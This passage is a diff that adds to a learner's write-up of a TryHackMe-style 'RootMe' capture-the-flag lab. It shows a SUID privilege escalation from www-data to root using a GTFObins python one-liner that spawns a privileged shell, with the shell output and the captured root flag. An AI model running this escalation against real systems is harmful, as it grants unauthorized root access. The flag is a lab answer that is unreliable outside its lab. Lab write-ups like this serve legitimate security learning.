@@ -154,3 +154,46 @@ www-data@rootme:/$ ^C
 
 
 ```
+
+Find a form to escalate your privileges.
+
+- Using the lectures from beginner path, SUID part, we can check for SUID 
+
+
+Tried using shell on GTFObins, but to no luck:
+
+```
+python -c 'import os; os.system("/bin/sh")'
+-data@rootme:/$ python -c 'import os; os.system("/bin/sh")'
+$ whoami
+www-data
+
+```
+
+- After multiple trial and error, i found the exploit for this machine:
+  
+  ![[Pasted image 20220818094330.png]]
+Note: disregard the sudo (as we don't have privileges); command 1
+then remove the ./ in the first part.
+
+Result:
+
+```
+$ ./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+/bin/sh: 8: ./python: not found
+$ python -c 'import os; os.execl("/bin/sh", "sh", "-p")'    
+# whoami
+root
+# 
+
+```
+
+
+
+```
+# cat root.txt
+THM{pr1v1l3g3_3sc4l4t10n}
+# 
+
+
+```
